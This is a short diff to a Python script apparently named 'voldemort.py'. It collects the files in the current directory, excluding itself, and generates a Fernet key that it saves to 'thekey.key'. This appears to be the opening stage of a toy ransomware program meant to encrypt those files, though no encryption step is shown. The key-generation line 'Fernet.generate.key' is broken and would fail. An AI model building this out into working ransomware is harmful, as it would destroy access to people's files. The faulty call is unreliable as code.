@@ -1,10 +1,19 @@
 import os
+from cryptography.fernet import Fernet
 files = []
 
 
 for file in os.listdir():
     if file == "voldemort.py":
         continue
-    files.append(file)
+    if os.path.isfile(file):
+        files.append(file)
 
 print(files)
+
+
+key = Fernet.generate.key
+
+
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
